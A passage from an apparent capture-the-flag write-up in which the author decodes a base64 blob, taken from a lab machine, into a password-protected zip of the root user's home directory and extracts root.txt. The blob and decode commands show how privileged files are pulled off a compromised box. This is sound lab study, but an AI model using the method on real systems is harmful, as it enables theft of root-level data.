ZpbWluZm9VVAkAA//U/GL/1PxidXgLAAEEAAAAAAQAAAAAon2yd+VC4IbVen5VnV9fwvPQFx30IM8ntK477rmCrkap7E4e+uqMDi1b4NnGfqHENOqmfKBUCarydZ4ZaiZ0AUhBKGSqKjidYao4eKn71egTJ0MglJ/SJ2SdMuFBxt/eFk0Jqx769hgjy/gstnsFFNMHDwZbxQsaKg1xCcvjq47i8vGVQdQa/YzEa8TKJXErSgk/UoGDvlGFoMYwWARJZGoSyTa/r/Q6MLVNHkRx/vjPTUzWDZjwl5wMkVUke/WHg8tD6qYETTWLMqhklMYQbvW73w/tTISmA6+lzgd2gOjfFn+/Wq1Is7zAc1THj8K5jM72xH+0tp2dccDi16TIVwWor4xGgBMy/KFxURKn3requMadd5eTQplgRfMYNE2ES6efdswhojNPJo1QaEuTNnxb0nGge32uYDDfgLJx5w/xIi2qUEsHCOD+VKdEAQAAhQIAAFBLAwQKAAAAAAAZiRBVAAAAAAAAAAAAAAAACwAcAHJvb3QvLm5hbm8vVVQJAAMSwftiHnTZanV4CwABBAAAAAAEAAAAAFBLAwQKAAkAAADGSjtL2e0fPBMAAAAHAAAAGQAcAHJvb3QvLm5hbm8vc2VhcmNoX2hpc3RvcnlVVAkAA7Nfy1mgX8tZdXgLAAEEAAAAAAQAAAAAhIbcggSAKsAIiA3D9BNHHNbPrFBLBwjZ7R88EwAAAAcAAABQSwECHgMKAAAAAABBF1ZdAAAAAAAAAAAAAAAABQAYAAAAAAAAABAAwEEAAAAAcm9vdC9VVAUAA6lt2Wp1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADRgxFHf7CuZIMAAACUAAAADQAYAAAAAAABAAAApIE/AAAAcm9vdC8ucHJvZmlsZVVUBQADGf7RVXV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAABmJEFUAAAAAAAAAAAAAAAAMABgAAAAAAAAAEADAQRkBAAByb290Ly5jYWNoZS9VVAUAAxLB+2J1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAAA0fCNLAAAAAAwAAAAAAAAAIAAYAAAAAAAAAAAApIFfAQAAcm9vdC8uY2FjaGUvbW90ZC5sZWdhbC1kaXNwbGF5ZWRVVAUAA8MSrFl1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAABBF1Zdv0XVNS0AAAAhAAAADQAYAAAAAAABAAAAoIHVAQAAcm9vdC9yb290LnR4dFVUBQADqW3ZanV4CwABBAAAAAAEAAAAAFBLAQIeAxQACQAIAOuRVke95RA+mwUAACIMAAAMABgAAAAAAAEAAACkgVkCAAByb290Ly5iYXNocmNVVAUAA6kZKVZ1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADEZRFV4P5Up0QBAACFAgAADQAYAAAAAAABAAAAgIFKCAAAcm9vdC8udmltaW5mb1VUBQAD/9T8YnV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAABmJEFUAAAAAAAAAAAAAAAALABgAAAAAAAAAEADtQeUJAAByb290Ly5uYW5vL1VUBQADEsH7YnV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAAMZKO0vZ7R88EwAAAAcAAAAZABgAAAAAAAEAAACAgSoKAAByb290Ly5uYW5vL3NlYXJjaF9oaXN0b3J5VVQFAAOzX8tZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAAJAAkA/gIAAKAKAAAAAA==bash-4.3$
```

This seems a lot different than the base64 encoded string of the troll face, I noticed it as it was not as long as the troll face's base64 encoded string was.

```
echo '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' > tmp.base64
```

```
base64 -d tmp.base64 > tmp
file tmp
file tmp
tmp: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Oct 22 2026 02:58:02, uncompressed size 0, method=store
unzip tmp
Archive:  tmp
   creating: root/
[tmp] root/.profile password: 
  inflating: root/.profile           
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history
```

And I was able to obtain the `/root/root.txt` flag with my approach, which turned out to be the same approach `ippsec` used in his video as well. And just to confirm that the content of the files was not altered, I tried to see the content of the file `/root/root.txt` & it was indeed untouched.

```
wc -c root/root.txt 
33 root/root.txt
```